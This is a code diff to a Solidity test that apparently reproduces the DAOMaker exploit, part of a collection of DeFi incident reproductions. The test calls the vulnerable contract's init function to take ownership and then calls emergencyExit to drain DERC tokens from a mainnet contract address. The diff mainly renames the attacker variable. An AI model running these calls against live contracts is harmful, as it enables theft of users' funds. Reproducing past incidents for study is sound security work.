@@ -14,7 +14,8 @@ interface DAOMaker {
 }
 
 contract Exploit_DAOMaker is TestHarness, TokenBalanceTracker {
-    address internal attacker = 0x2708CACE7b42302aF26F1AB896111d87FAEFf92f;
+    // The actula attacker address is: 0x2708CACE7b42302aF26F1AB896111d87FAEFf92f;
+    address internal attacker = address(this);
     DAOMaker internal daomaker = DAOMaker(0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940);
 
     IERC20 internal derc = IERC20(0x9fa69536d1cda4A04cFB50688294de75B505a9aE);
@@ -27,9 +28,9 @@ contract Exploit_DAOMaker is TestHarness, TokenBalanceTracker {
 
     function test_attack() external {
         console.log('------- STEP 0: INITIAL BALANCE -------');
-        logBalances(address(this));
+        logBalances(attacker);
 
-        uint256 balanceBefore = derc.balanceOf(address(this));
+        uint256 balanceBefore = derc.balanceOf(attacker);
 
         console.log('------- STEP 1: INITIALIZATION -------');
         uint256 initBlock = block.number;
@@ -44,21 +45,21 @@ contract Exploit_DAOMaker is TestHarness, TokenBalanceTracker {
 
         daomaker.init(start, releasePeriods, releasePercents, address(derc));
         console.log(daomaker.owner());
-        console.log(address(this));
+        console.log(attacker);
        
         console.log('Current Block:', initBlock);
-        logBalances(address(this));
+        logBalances(attacker);
         console.log('\n');
-        assertEq(daomaker.owner(), address(this));
+        assertEq(daomaker.owner(), attacker);
         
         console.log('------- STEP 2: DERC EXIT -------');
 
-        assertEq(daomaker.owner(), address(this));
-        daomaker.emergencyExit(address(this));
+        assertEq(daomaker.owner(), attacker);
+        daomaker.emergencyExit(attacker);
 
-        uint256 balanceAfter = derc.balanceOf(address(this));
+        uint256 balanceAfter = derc.balanceOf(attacker);
         assertGe(balanceAfter, balanceBefore);
-        logBalances(msg.sender);
+        logBalances(attacker);
     }
 
 
